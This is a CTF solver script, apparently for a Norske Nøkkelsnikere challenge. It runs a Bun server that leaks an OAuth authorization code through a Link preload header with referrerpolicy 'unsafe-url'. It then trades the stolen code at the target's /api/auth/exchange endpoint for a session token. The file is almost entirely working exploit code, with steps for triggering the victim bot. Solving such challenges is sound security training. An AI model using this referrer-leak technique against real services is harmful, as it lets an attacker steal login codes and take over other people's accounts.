/*
 * Copyright 2025 Norske Nøkkelsnikere
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

// Replace me with the publicly facing domain running the program
// You can for example use ngrok.
// Do not include the protocol, it's assumed to be HTTPS.
const DOMAIN = '[redacted].ngrok-free.app';

// The challenge URL, used for exchanging the token
const INSTANCE_DOMAIN = '[redacted].chall.dev.nnsc.tf';

if (DOMAIN === '') {
  throw new Error("You haven't set the domain. Please edit the solver.");
}
if (INSTANCE_DOMAIN === '') {
  throw new Error("You haven't set the domain. Please edit the solver.");
}

Bun.serve({
  routes: {
    '/img1': async (req) => {
      console.log('/img1 hit');
      return new Response(await Bun.file('./img.png').bytes(), {
        headers: {
          'Content-Type': 'image/png',
          Link: `<https://${DOMAIN}/img2>;rel="preload";as="image";referrerpolicy="unsafe-url"`,
        },
      });
    },
    '/img2': async (req) => {
      const referer = req.headers.get('referer');
      if (!referer || !referer.includes('code=')) {
        console.warn('Instantly returning image, not happy with referer: ', referer);
        return new Response(await Bun.file('./img.png').bytes(), {
          headers: {
            'Content-Type': 'image/png',
          },
        });
      }

      console.log('Referer', referer);
      const url = new URL(referer);
      const code = url.searchParams.get('code')!;
      console.log('Code', code);

      const res = await fetch(`https://${INSTANCE_DOMAIN}/api/auth/exchange`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          code,
        }),
      });

      const json = await res.json();
      console.log('Decode the JWT to find flag!', json);

      // Make sure we don't return too quickly, the frontend will exchange the code!
      await Bun.sleep(3000);
      console.log('Returning');
      return new Response(await Bun.file('./img.png').bytes(), {
        headers: {
          'Content-Type': 'image/png',
        },
      });
    },
  },

  fetch(req) {
    return new Response('Not Found', { status: 404 });
  },
});

console.log('Remember to update with your own server and instance!');
console.log(`Set profile picture to https://${DOMAIN}/img1`);
console.log(`Use report path /idp/login?redirectUrl=${encodeURIComponent('/profile/john')}`);
